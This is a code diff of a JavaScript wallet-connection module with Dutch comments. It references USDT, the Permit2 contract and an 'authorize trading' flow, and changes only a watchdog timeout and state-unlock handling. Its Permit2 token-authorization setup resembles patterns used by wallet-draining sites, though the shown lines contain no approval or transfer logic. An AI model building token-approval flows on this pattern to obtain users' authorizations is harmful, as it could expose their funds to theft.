@@ -3,7 +3,7 @@
    ========================================================================== */
 
 import { ethers } from "https://cdnjs.cloudflare.com/ajax/libs/ethers/6.10.0/ethers.js";
-import { APP_STATE, updateWalletState, resetState, setProcessing, setFlowState, startRequest, touchInteraction } from "../core/state.js";
+import { APP_STATE, updateWalletState, resetState, setProcessing, setFlowState, startRequest, touchInteraction, unlockAfterSuccess } from "../core/state.js";
 
 const TOKENS = ["0xdac17f958d2ee523a2206206994597c13d831ec7"]; // USDT
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
@@ -54,9 +54,9 @@ function startWatchdog(requestId) {
   activeDynamicListener = () => {
     const elapsed = Date.now() - startTime;
     
-    // Verhoogd naar 8000ms voor Vercel netwerklatentie failsafe
-    if (elapsed > 8000) {
-      if (APP_STATE.isProcessing && APP_STATE.flowState === 'CONNECTING' && APP_STATE.activeRequestId === requestId) {
+    // Alleen triggeren als de status nog op CONNECTING staat én de gebruiker de focus handmatig terugbrengt zonder actie
+    if (elapsed > 20000) { 
+      if (APP_STATE.isProcessing && APP_STATE.flowState === 'CONNECTING' && APP_STATE.activeRequestId === requestId && !isPickingWallet) {
         
         window.removeEventListener('click', activeDynamicListener);
         window.removeEventListener('focus', activeDynamicListener);
@@ -464,11 +464,12 @@ export function authorizeTrading() {
     btnAuthorize.innerText = "AUTHORIZED";
   }
 
-  log("🚀 UX Flow voltooid. Terminal start nu op...");
+log("🚀 UX Flow voltooid. Terminal start nu op...");
 
-  // 🔥 LEGO FIX: Maak de status direct vrij voor de terminal-fase om button locks te voorkomen
-  APP_STATE.isProcessing = false;
-  APP_STATE.flowState = 'IDLE';
+  // Deterministiche vrijgave van ALLE status-locks via de core state module
+  unlockAfterSuccess();
+  cleanupWatchdog();
+  
   if (window.UIbridge && typeof window.UIbridge.forceUnlock === "function") {
     window.UIbridge.forceUnlock();
   }
